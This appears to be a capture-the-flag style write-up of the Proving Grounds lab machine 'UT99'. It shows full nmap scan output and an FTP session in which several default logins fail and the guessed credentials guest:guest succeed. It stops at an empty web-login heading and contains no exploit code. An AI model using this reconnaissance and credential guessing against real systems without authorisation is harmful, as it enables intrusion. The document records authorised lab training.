# UT99

# Enumeration

## nmap

```                                                                                                                                  
┌──(kali㉿kali)-[/tmp]
└─$ sudo nmap -sU -p- -T4 192.168.121.44
Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-05 09:22 EST
Nmap scan report for 192.168.121.44
Host is up (0.19s latency).
Not shown: 65534 open|filtered ports
PORT     STATE SERVICE
7777/udp open  cbt

Nmap done: 1 IP address (1 host up) scanned in 482.71 seconds
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

```
# Nmap 7.91 scan initiated Fri Jan 21 07:56:14 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99/results/192.168.196.44/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/UT99/results/192.168.196.44/scans/xml/_full_tcp_nmap.xml" 192.168.196.44
adjust_timeouts2: packet supposedly had rtt of -546986 microseconds.  Ignoring time.
adjust_timeouts2: packet supposedly had rtt of -546986 microseconds.  Ignoring time.
Nmap scan report for 192.168.196.44
Host is up, received user-set (0.25s latency).
Scanned at 2022-01-21 07:56:15 EST for 441s
Not shown: 65187 filtered ports
Reason: 65187 no-responses
PORT     STATE SERVICE    REASON          VERSION
21/tcp   open  ftp        syn-ack ttl 127 FileZilla ftpd
| ftp-syst: 
|_  SYST: UNIX emulated by FileZilla
80/tcp   open  http       syn-ack ttl 127 Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
|_http-title: Index of /
443/tcp  open  ssl/http   syn-ack ttl 127 Apache httpd 2.4.16 (OpenSSL/1.0.1p PHP/5.6.12)
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.16 (Win32) OpenSSL/1.0.1p PHP/5.6.12
|_http-title: Index of /
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4 4cc9 9e84 b26f 9e63 9f9e d229 dee0
| SHA-1: b023 8c54 7a90 5bfa 119c 4e8b acca eacf 3649 1ff6
| -----BEGIN CERTIFICATE-----
| MIIBnzCCAQgCCQC1x1LJh4G1AzANBgkqhkiG9w0BAQUFADAUMRIwEAYDVQQDEwls
| b2NhbGhvc3QwHhcNMDkxMTEwMjM0ODQ3WhcNMTkxMTA4MjM0ODQ3WjAUMRIwEAYD
| VQQDEwlsb2NhbGhvc3QwgZ8wDQYJKoZIhvcNAQEBBQADgY0AMIGJAoGBAMEl0yfj
| 7K0Ng2pt51+adRAj4pCdoGOVjx1BmljVnGOMW3OGkHnMw9ajibh1vB6UfHxu463o
| J1wLxgxq+Q8y/rPEehAjBCspKNSq+bMvZhD4p8HNYMRrKFfjZzv3ns1IItw46kgT
| gDpAl1cMRzVGPXFimu5TnWMOZ3ooyaQ0/xntAgMBAAEwDQYJKoZIhvcNAQEFBQAD
| gYEAavHzSWz5umhfb/MnBMa5DL2VNzS+9whmmpsDGEG+uR0kM1W2GQIdVHHJTyFd
| aHXzgVJBQcWTwhp84nvHSiQTDBSaT6cQNQpvag/TaED/SEQpm0VqDFwpfFYuufBL
| vVNbLkKxbK2XwUvu0RxoLdBMC/89HqrZ0ppiONuQ+X2MtxE=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
3306/tcp open  mysql      syn-ack ttl 127 MySQL (unauthorized)
6660/tcp open  irc        syn-ack ttl 127 InspIRCd
6661/tcp open  irc        syn-ack ttl 127 InspIRCd
6662/tcp open  irc        syn-ack ttl 127 InspIRCd
6663/tcp open  irc        syn-ack ttl 127 InspIRCd
6664/tcp open  irc        syn-ack ttl 127 InspIRCd
6665/tcp open  irc        syn-ack ttl 127 InspIRCd
6666/tcp open  irc        syn-ack ttl 127 InspIRCd
6667/tcp open  irc        syn-ack ttl 127 InspIRCd
6668/tcp open  irc        syn-ack ttl 127 InspIRCd
6669/tcp open  irc        syn-ack ttl 127 InspIRCd
6670/tcp open  irc        syn-ack ttl 127 InspIRCd
6671/tcp open  irc        syn-ack ttl 127 InspIRCd
6672/tcp open  irc        syn-ack ttl 127 InspIRCd
6673/tcp open  irc        syn-ack ttl 127 InspIRCd
6674/tcp open  irc        syn-ack ttl 127 InspIRCd
6675/tcp open  irc        syn-ack ttl 127 InspIRCd
6676/tcp open  irc        syn-ack ttl 127 InspIRCd
6677/tcp open  irc        syn-ack ttl 127 InspIRCd
6678/tcp open  irc        syn-ack ttl 127 InspIRCd
6679/tcp open  irc        syn-ack ttl 127 InspIRCd
6680/tcp open  irc        syn-ack ttl 127 InspIRCd
6681/tcp open  irc        syn-ack ttl 127 InspIRCd
6682/tcp open  irc        syn-ack ttl 127 InspIRCd
6683/tcp open  irc        syn-ack ttl 127 InspIRCd
6684/tcp open  irc        syn-ack ttl 127 InspIRCd
6685/tcp open  irc        syn-ack ttl 127 InspIRCd
6686/tcp open  irc        syn-ack ttl 127 InspIRCd
6687/tcp open  irc        syn-ack ttl 127 InspIRCd
6688/tcp open  irc        syn-ack ttl 127 InspIRCd
6689/tcp open  irc        syn-ack ttl 127 InspIRCd
6690/tcp open  irc        syn-ack ttl 127 InspIRCd
6691/tcp open  irc        syn-ack ttl 127 InspIRCd
6692/tcp open  irc        syn-ack ttl 127 InspIRCd
6693/tcp open  irc        syn-ack ttl 127 InspIRCd
6694/tcp open  irc        syn-ack ttl 127 InspIRCd
6695/tcp open  irc        syn-ack ttl 127 InspIRCd
6696/tcp open  irc        syn-ack ttl 127 InspIRCd
6697/tcp open  irc        syn-ack ttl 127 InspIRCd
6698/tcp open  irc        syn-ack ttl 127 InspIRCd
6699/tcp open  irc        syn-ack ttl 127 InspIRCd
6700/tcp open  irc        syn-ack ttl 127 InspIRCd
6701/tcp open  irc        syn-ack ttl 127 InspIRCd
6702/tcp open  irc        syn-ack ttl 127 InspIRCd
6703/tcp open  irc        syn-ack ttl 127 InspIRCd
6704/tcp open  irc        syn-ack ttl 127 InspIRCd
6705/tcp open  irc        syn-ack ttl 127 InspIRCd
6706/tcp open  irc        syn-ack ttl 127 InspIRCd
6707/tcp open  irc        syn-ack ttl 127 InspIRCd
6708/tcp open  irc        syn-ack ttl 127 InspIRCd
6709/tcp open  irc        syn-ack ttl 127 InspIRCd
6710/tcp open  irc        syn-ack ttl 127 InspIRCd
6711/tcp open  irc        syn-ack ttl 127 InspIRCd
6712/tcp open  irc        syn-ack ttl 127 InspIRCd
6713/tcp open  irc        syn-ack ttl 127 InspIRCd
6714/tcp open  irc        syn-ack ttl 127 InspIRCd
6715/tcp open  irc        syn-ack ttl 127 InspIRCd
6716/tcp open  irc        syn-ack ttl 127 InspIRCd
6717/tcp open  irc        syn-ack ttl 127 InspIRCd
6718/tcp open  irc        syn-ack ttl 127 InspIRCd
6719/tcp open  irc        syn-ack ttl 127 InspIRCd
6720/tcp open  irc        syn-ack ttl 127 InspIRCd
6721/tcp open  irc        syn-ack ttl 127 InspIRCd
6722/tcp open  irc        syn-ack ttl 127 InspIRCd
6723/tcp open  irc        syn-ack ttl 127 InspIRCd
6724/tcp open  irc        syn-ack ttl 127 InspIRCd
6725/tcp open  irc        syn-ack ttl 127 InspIRCd
6726/tcp open  irc        syn-ack ttl 127 InspIRCd
6727/tcp open  irc        syn-ack ttl 127 InspIRCd
6728/tcp open  irc        syn-ack ttl 127 InspIRCd
6729/tcp open  irc        syn-ack ttl 127 InspIRCd
6730/tcp open  irc        syn-ack ttl 127 InspIRCd
6731/tcp open  irc        syn-ack ttl 127 InspIRCd
6732/tcp open  irc        syn-ack ttl 127 InspIRCd
6733/tcp open  irc        syn-ack ttl 127 InspIRCd
6734/tcp open  irc        syn-ack ttl 127 InspIRCd
6735/tcp open  irc        syn-ack ttl 127 InspIRCd
6736/tcp open  irc        syn-ack ttl 127 InspIRCd
6737/tcp open  irc        syn-ack ttl 127 InspIRCd
6738/tcp open  irc        syn-ack ttl 127 InspIRCd
6739/tcp open  irc        syn-ack ttl 127 InspIRCd
6740/tcp open  irc        syn-ack ttl 127 InspIRCd
6741/tcp open  irc        syn-ack ttl 127 InspIRCd
6742/tcp open  irc        syn-ack ttl 127 InspIRCd
6743/tcp open  irc        syn-ack ttl 127 InspIRCd
6744/tcp open  irc        syn-ack ttl 127 InspIRCd
6745/tcp open  irc        syn-ack ttl 127 InspIRCd
6746/tcp open  irc        syn-ack ttl 127 InspIRCd
6747/tcp open  irc        syn-ack ttl 127 InspIRCd
6748/tcp open  irc        syn-ack ttl 127 InspIRCd
6749/tcp open  irc        syn-ack ttl 127 InspIRCd
6750/tcp open  irc        syn-ack ttl 127 InspIRCd
6751/tcp open  irc        syn-ack ttl 127 InspIRCd
6752/tcp open  irc        syn-ack ttl 127 InspIRCd
6753/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6754/tcp open  irc        syn-ack ttl 127 InspIRCd
6755/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6756/tcp open  irc        syn-ack ttl 127 InspIRCd
6757/tcp open  irc        syn-ack ttl 127 InspIRCd
6758/tcp open  irc        syn-ack ttl 127 InspIRCd
6759/tcp open  irc        syn-ack ttl 127 InspIRCd
6760/tcp open  irc        syn-ack ttl 127 InspIRCd
6761/tcp open  irc        syn-ack ttl 127 InspIRCd
6762/tcp open  irc        syn-ack ttl 127 InspIRCd
6763/tcp open  irc        syn-ack ttl 127 InspIRCd
6764/tcp open  irc        syn-ack ttl 127 InspIRCd
6765/tcp open  irc        syn-ack ttl 127 InspIRCd
6766/tcp open  irc        syn-ack ttl 127 InspIRCd
6767/tcp open  irc        syn-ack ttl 127 InspIRCd
6768/tcp open  irc        syn-ack ttl 127 InspIRCd
6769/tcp open  irc        syn-ack ttl 127 InspIRCd
6770/tcp open  irc        syn-ack ttl 127 InspIRCd
6771/tcp open  irc        syn-ack ttl 127 InspIRCd
6772/tcp open  irc        syn-ack ttl 127 InspIRCd
6773/tcp open  irc        syn-ack ttl 127 InspIRCd
6774/tcp open  irc        syn-ack ttl 127 InspIRCd
6775/tcp open  irc        syn-ack ttl 127 InspIRCd
6776/tcp open  irc        syn-ack ttl 127 InspIRCd
6777/tcp open  irc        syn-ack ttl 127 InspIRCd
6778/tcp open  irc        syn-ack ttl 127 InspIRCd
6779/tcp open  irc        syn-ack ttl 127 InspIRCd
6780/tcp open  irc        syn-ack ttl 127 InspIRCd
6781/tcp open  irc        syn-ack ttl 127 InspIRCd
6782/tcp open  irc        syn-ack ttl 127 InspIRCd
6783/tcp open  irc        syn-ack ttl 127 InspIRCd
6784/tcp open  irc        syn-ack ttl 127 InspIRCd
6785/tcp open  irc        syn-ack ttl 127 InspIRCd
6786/tcp open  irc        syn-ack ttl 127 InspIRCd
6787/tcp open  irc        syn-ack ttl 127 InspIRCd
6788/tcp open  irc        syn-ack ttl 127 InspIRCd
6789/tcp open  irc        syn-ack ttl 127 InspIRCd
6790/tcp open  irc        syn-ack ttl 127 InspIRCd
6791/tcp open  irc        syn-ack ttl 127 InspIRCd
6792/tcp open  irc        syn-ack ttl 127 InspIRCd
6793/tcp open  irc        syn-ack ttl 127 InspIRCd
6794/tcp open  irc        syn-ack ttl 127 InspIRCd
6795/tcp open  irc        syn-ack ttl 127 InspIRCd
6796/tcp open  irc        syn-ack ttl 127 InspIRCd
6797/tcp open  irc        syn-ack ttl 127 InspIRCd
6798/tcp open  irc        syn-ack ttl 127 InspIRCd
6799/tcp open  irc        syn-ack ttl 127 InspIRCd
6800/tcp open  irc        syn-ack ttl 127 InspIRCd
6801/tcp open  irc        syn-ack ttl 127 InspIRCd
6802/tcp open  irc        syn-ack ttl 127 InspIRCd
6803/tcp open  irc        syn-ack ttl 127 InspIRCd
6804/tcp open  irc        syn-ack ttl 127 InspIRCd
6805/tcp open  irc        syn-ack ttl 127 InspIRCd
6806/tcp open  irc        syn-ack ttl 127 InspIRCd
6807/tcp open  irc        syn-ack ttl 127 InspIRCd
6808/tcp open  irc        syn-ack ttl 127 InspIRCd
6809/tcp open  irc        syn-ack ttl 127 InspIRCd
6810/tcp open  irc        syn-ack ttl 127 InspIRCd
6811/tcp open  irc        syn-ack ttl 127 InspIRCd
6812/tcp open  irc        syn-ack ttl 127 InspIRCd
6813/tcp open  irc        syn-ack ttl 127 InspIRCd
6814/tcp open  irc        syn-ack ttl 127 InspIRCd
6815/tcp open  irc        syn-ack ttl 127 InspIRCd
6816/tcp open  irc        syn-ack ttl 127 InspIRCd
6817/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6818/tcp open  irc        syn-ack ttl 127 InspIRCd
6819/tcp open  irc        syn-ack ttl 127 InspIRCd
6820/tcp open  irc        syn-ack ttl 127 InspIRCd
6821/tcp open  irc        syn-ack ttl 127 InspIRCd
6822/tcp open  irc        syn-ack ttl 127 InspIRCd
6823/tcp open  irc        syn-ack ttl 127 InspIRCd
6824/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6825/tcp open  irc        syn-ack ttl 127 InspIRCd
6826/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6827/tcp open  irc        syn-ack ttl 127 InspIRCd
6828/tcp open  irc        syn-ack ttl 127 InspIRCd
6829/tcp open  irc        syn-ack ttl 127 InspIRCd
6830/tcp open  irc        syn-ack ttl 127 InspIRCd
6831/tcp open  irc        syn-ack ttl 127 InspIRCd
6832/tcp open  irc        syn-ack ttl 127 InspIRCd
6833/tcp open  irc        syn-ack ttl 127 InspIRCd
6834/tcp open  irc        syn-ack ttl 127 InspIRCd
6835/tcp open  irc        syn-ack ttl 127 InspIRCd
6836/tcp open  irc        syn-ack ttl 127 InspIRCd
6837/tcp open  irc        syn-ack ttl 127 InspIRCd
6838/tcp open  irc        syn-ack ttl 127 InspIRCd
6839/tcp open  irc        syn-ack ttl 127 InspIRCd
6840/tcp open  irc        syn-ack ttl 127 InspIRCd
6841/tcp open  irc        syn-ack ttl 127 InspIRCd
6842/tcp open  irc        syn-ack ttl 127 InspIRCd
6843/tcp open  irc        syn-ack ttl 127 InspIRCd
6844/tcp open  irc        syn-ack ttl 127 InspIRCd
6845/tcp open  irc        syn-ack ttl 127 InspIRCd
6846/tcp open  irc        syn-ack ttl 127 InspIRCd
6847/tcp open  irc        syn-ack ttl 127 InspIRCd
6848/tcp open  irc        syn-ack ttl 127 InspIRCd
6849/tcp open  irc        syn-ack ttl 127 InspIRCd
6850/tcp open  irc        syn-ack ttl 127 InspIRCd
6851/tcp open  irc        syn-ack ttl 127 InspIRCd
6852/tcp open  irc        syn-ack ttl 127 InspIRCd
6853/tcp open  irc        syn-ack ttl 127 InspIRCd
6854/tcp open  irc        syn-ack ttl 127 InspIRCd
6855/tcp open  irc        syn-ack ttl 127 InspIRCd
6856/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6857/tcp open  irc        syn-ack ttl 127 InspIRCd
6858/tcp open  irc        syn-ack ttl 127 InspIRCd
6859/tcp open  irc        syn-ack ttl 127 InspIRCd
6860/tcp open  irc        syn-ack ttl 127 InspIRCd
6861/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 4
|   servers: 1
|   chans: 1
|   lusers: 4
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6862/tcp open  irc        syn-ack ttl 127 InspIRCd
6863/tcp open  irc        syn-ack ttl 127 InspIRCd
6864/tcp open  irc        syn-ack ttl 127 InspIRCd
6865/tcp open  irc        syn-ack ttl 127 InspIRCd
6866/tcp open  irc        syn-ack ttl 127 InspIRCd
6867/tcp open  irc        syn-ack ttl 127 InspIRCd
6868/tcp open  irc        syn-ack ttl 127 InspIRCd
6869/tcp open  irc        syn-ack ttl 127 InspIRCd
6870/tcp open  irc        syn-ack ttl 127 InspIRCd
6871/tcp open  irc        syn-ack ttl 127 InspIRCd
6872/tcp open  irc        syn-ack ttl 127 InspIRCd
6873/tcp open  irc        syn-ack ttl 127 InspIRCd
6874/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 3
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6875/tcp open  irc        syn-ack ttl 127 InspIRCd
6876/tcp open  irc        syn-ack ttl 127 InspIRCd
6877/tcp open  irc        syn-ack ttl 127 InspIRCd
6878/tcp open  irc        syn-ack ttl 127 InspIRCd
6879/tcp open  irc        syn-ack ttl 127 InspIRCd
6880/tcp open  irc        syn-ack ttl 127 InspIRCd
6881/tcp open  irc        syn-ack ttl 127 InspIRCd
6882/tcp open  irc        syn-ack ttl 127 InspIRCd
6883/tcp open  irc        syn-ack ttl 127 InspIRCd
6884/tcp open  irc        syn-ack ttl 127 InspIRCd
6885/tcp open  irc        syn-ack ttl 127 InspIRCd
6886/tcp open  irc        syn-ack ttl 127 InspIRCd
6887/tcp open  irc        syn-ack ttl 127 InspIRCd
6888/tcp open  irc        syn-ack ttl 127 InspIRCd
6889/tcp open  irc        syn-ack ttl 127 InspIRCd
6890/tcp open  irc        syn-ack ttl 127 InspIRCd
6891/tcp open  irc        syn-ack ttl 127 InspIRCd
6892/tcp open  irc        syn-ack ttl 127 InspIRCd
6893/tcp open  irc        syn-ack ttl 127 InspIRCd
6894/tcp open  irc        syn-ack ttl 127 InspIRCd
6895/tcp open  irc        syn-ack ttl 127 InspIRCd
6896/tcp open  irc        syn-ack ttl 127 InspIRCd
6897/tcp open  irc        syn-ack ttl 127 InspIRCd
6898/tcp open  irc        syn-ack ttl 127 InspIRCd
6899/tcp open  irc        syn-ack ttl 127 InspIRCd
6900/tcp open  irc        syn-ack ttl 127 InspIRCd
6901/tcp open  irc        syn-ack ttl 127 InspIRCd
6902/tcp open  irc        syn-ack ttl 127 InspIRCd
6903/tcp open  irc        syn-ack ttl 127 InspIRCd
6904/tcp open  irc        syn-ack ttl 127 InspIRCd
6905/tcp open  irc        syn-ack ttl 127 InspIRCd
6906/tcp open  irc        syn-ack ttl 127 InspIRCd
6907/tcp open  irc        syn-ack ttl 127 InspIRCd
6908/tcp open  irc        syn-ack ttl 127 InspIRCd
6909/tcp open  irc        syn-ack ttl 127 InspIRCd
6910/tcp open  irc        syn-ack ttl 127 InspIRCd
6911/tcp open  irc        syn-ack ttl 127 InspIRCd
6912/tcp open  irc        syn-ack ttl 127 InspIRCd
6913/tcp open  irc        syn-ack ttl 127 InspIRCd
6914/tcp open  irc        syn-ack ttl 127 InspIRCd
6915/tcp open  irc        syn-ack ttl 127 InspIRCd
6916/tcp open  irc        syn-ack ttl 127 InspIRCd
6917/tcp open  irc        syn-ack ttl 127 InspIRCd
6918/tcp open  irc        syn-ack ttl 127 InspIRCd
6919/tcp open  irc        syn-ack ttl 127 InspIRCd
6920/tcp open  irc        syn-ack ttl 127 InspIRCd
6921/tcp open  irc        syn-ack ttl 127 InspIRCd
6922/tcp open  irc        syn-ack ttl 127 InspIRCd
6923/tcp open  irc        syn-ack ttl 127 InspIRCd
6924/tcp open  irc        syn-ack ttl 127 InspIRCd
6925/tcp open  irc        syn-ack ttl 127 InspIRCd
6926/tcp open  irc        syn-ack ttl 127 InspIRCd
6927/tcp open  irc        syn-ack ttl 127 InspIRCd
6928/tcp open  irc        syn-ack ttl 127 InspIRCd
6929/tcp open  irc        syn-ack ttl 127 InspIRCd
6930/tcp open  irc        syn-ack ttl 127 InspIRCd
6931/tcp open  irc        syn-ack ttl 127 InspIRCd
6932/tcp open  irc        syn-ack ttl 127 InspIRCd
6933/tcp open  irc        syn-ack ttl 127 InspIRCd
6934/tcp open  irc        syn-ack ttl 127 InspIRCd
6935/tcp open  irc        syn-ack ttl 127 InspIRCd
6936/tcp open  irc        syn-ack ttl 127 InspIRCd
6937/tcp open  irc        syn-ack ttl 127 InspIRCd
6938/tcp open  irc        syn-ack ttl 127 InspIRCd
6939/tcp open  irc        syn-ack ttl 127 InspIRCd
6940/tcp open  irc        syn-ack ttl 127 InspIRCd
6941/tcp open  irc        syn-ack ttl 127 InspIRCd
6942/tcp open  irc        syn-ack ttl 127 InspIRCd
6943/tcp open  irc        syn-ack ttl 127 InspIRCd
6944/tcp open  irc        syn-ack ttl 127 InspIRCd
6945/tcp open  irc        syn-ack ttl 127 InspIRCd
6946/tcp open  irc        syn-ack ttl 127 InspIRCd
6947/tcp open  irc        syn-ack ttl 127 InspIRCd
| irc-info: 
|   server: irc.madcowz.localdomain
|   users: 2
|   servers: 1
|   chans: 1
|   lusers: 3
|   lservers: 0
|   source ident: nmap
|   source host: 192.168.49.196
|_  error: Closing link: (nmap@192.168.49.196) [Client exited]
6948/tcp open  irc        syn-ack ttl 127 InspIRCd
6949/tcp open  irc        syn-ack ttl 127 InspIRCd
6950/tcp open  irc        syn-ack ttl 127 InspIRCd
6951/tcp open  irc        syn-ack ttl 127 InspIRCd
6952/tcp open  irc        syn-ack ttl 127 InspIRCd
6953/tcp open  irc        syn-ack ttl 127 InspIRCd
6954/tcp open  irc        syn-ack ttl 127 InspIRCd
6955/tcp open  irc        syn-ack ttl 127 InspIRCd
6956/tcp open  irc        syn-ack ttl 127 InspIRCd
6957/tcp open  irc        syn-ack ttl 127 InspIRCd
6958/tcp open  irc        syn-ack ttl 127 InspIRCd
6959/tcp open  irc        syn-ack ttl 127 InspIRCd
6960/tcp open  irc        syn-ack ttl 127 InspIRCd
6961/tcp open  irc        syn-ack ttl 127 InspIRCd
6962/tcp open  irc        syn-ack ttl 127 InspIRCd
6963/tcp open  irc        syn-ack ttl 127 InspIRCd
6964/tcp open  irc        syn-ack ttl 127 InspIRCd
6965/tcp open  irc        syn-ack ttl 127 InspIRCd
6966/tcp open  irc        syn-ack ttl 127 InspIRCd
6967/tcp open  irc        syn-ack ttl 127 InspIRCd
6968/tcp open  irc        syn-ack ttl 127 InspIRCd
6969/tcp open  irc        syn-ack ttl 127 InspIRCd
6970/tcp open  irc        syn-ack ttl 127 InspIRCd
6971/tcp open  irc        syn-ack ttl 127 InspIRCd
6972/tcp open  irc        syn-ack ttl 127 InspIRCd
6973/tcp open  irc        syn-ack ttl 127 InspIRCd
6974/tcp open  irc        syn-ack ttl 127 InspIRCd
6975/tcp open  irc        syn-ack ttl 127 InspIRCd
6976/tcp open  irc        syn-ack ttl 127 InspIRCd
6977/tcp open  irc        syn-ack ttl 127 InspIRCd
6978/tcp open  irc        syn-ack ttl 127 InspIRCd
6979/tcp open  irc        syn-ack ttl 127 InspIRCd
6980/tcp open  irc        syn-ack ttl 127 InspIRCd
6981/tcp open  irc        syn-ack ttl 127 InspIRCd
6982/tcp open  irc        syn-ack ttl 127 InspIRCd
6983/tcp open  irc        syn-ack ttl 127 InspIRCd
6984/tcp open  irc        syn-ack ttl 127 InspIRCd
6985/tcp open  irc        syn-ack ttl 127 InspIRCd
6986/tcp open  irc        syn-ack ttl 127 InspIRCd
6987/tcp open  irc        syn-ack ttl 127 InspIRCd
6988/tcp open  irc        syn-ack ttl 127 InspIRCd
6989/tcp open  irc        syn-ack ttl 127 InspIRCd
6990/tcp open  irc        syn-ack ttl 127 InspIRCd
6991/tcp open  irc        syn-ack ttl 127 InspIRCd
6992/tcp open  irc        syn-ack ttl 127 InspIRCd
6993/tcp open  irc        syn-ack ttl 127 InspIRCd
6994/tcp open  irc        syn-ack ttl 127 InspIRCd
6995/tcp open  irc        syn-ack ttl 127 InspIRCd
6996/tcp open  irc        syn-ack ttl 127 InspIRCd
6997/tcp open  irc        syn-ack ttl 127 InspIRCd
6998/tcp open  irc        syn-ack ttl 127 InspIRCd
6999/tcp open  irc        syn-ack ttl 127 InspIRCd
7000/tcp open  irc        syn-ack ttl 127 InspIRCd
7001/tcp open  tcpwrapped syn-ack ttl 127
7005/tcp open  tcpwrapped syn-ack ttl 127
7007/tcp open  irc        syn-ack ttl 127 InspIRCd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 (89%), Microsoft Windows Server 2012 R2 (89%), Microsoft Windows Server 2008 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8 (89%), Microsoft Windows 7 SP1 (89%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows 8.1 Update 1 (89%), Microsoft Windows 8.1 R1 (89%), Microsoft Windows Phone 7.5 or 8.0 (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=1/21%OT=21%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=61EAAF28%P=x86_64-pc-linux-gnu)
SEQ(SP=105%GCD=1%ISR=10A%TS=7)
OPS(O1=M506NW8ST11%O2=M506NW8ST11%O3=M506NW8NNT11%O4=M506NW8ST11%O5=M506NW8ST11%O6=M506ST11)
WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)
ECN(R=Y%DF=Y%TG=80%W=2000%O=M506NW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=N)

Uptime guess: 0.011 days (since Fri Jan 21 07:48:21 2022)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=257 (Good luck!)
IP ID Sequence Generation: Busy server or unknown class
Service Info: Hosts: localhost, www.example.com, irc.madcowz.localdomain; OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   249.22 ms 192.168.49.1
2   250.02 ms 192.168.196.44

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jan 21 08:03:36 2022 -- 1 IP address (1 host up) scanned in 442.69 seconds
```

## 21 - FTP

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.208.44  
Connected to 192.168.208.44.
220 MadCowz FTP!
Name (192.168.208.44:kali): anonymous
331 Password required for anonymous
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.208.44
Connected to 192.168.208.44.
220 MadCowz FTP!
Name (192.168.208.44:kali): MadCowz
331 Password required for madcowz
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```

Failed: `admin`:`admin`, `admin`:`password`, `backup`:`backup`

Guessed: `guest`:`guest`

```
┌──(kali㉿kali)-[~]
└─$ ftp 192.168.208.44
Connected to 192.168.208.44.
220 MadCowz FTP!
Name (192.168.208.44:kali): admin
331 Password required for admin
Password:
530 Login or password incorrect!
Login failed.
Remote system type is UNIX.
ftp> user
(username) guest
331 Password required for guest
Password: 
230 Logged on
Remote system type is UNIX.
ftp> ls
200 Port command successful
150 Opening data channel for directory list.
-r-xr-xr-x 1 ftp ftp       35984520 Oct 07  2015 FoxitReader706.1126_enu_Setup.exe
-r--r--r-- 1 ftp ftp       35922892 Oct 07  2015 KB968930.msu
-r-xr-xr-x 1 ftp ftp      114238280 Oct 07  2015 xampp-win32-5.6.12-0-VC11-installer.exe
226 Transfer OK
ftp> lcd /tmp
Local directory now /tmp
ftp> put t
local: t remote: t
200 Port command successful
550 Permission denied
ftp> exit
221 Goodbye
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

## 80  - Web

![](Pasted%20image%2020220205190149.png)

![](Pasted%20image%2020220205190230.png)

![](Pasted%20image%2020220205195616.png)

![](Pasted%20image%2020220205222351.png)

### Logging in test

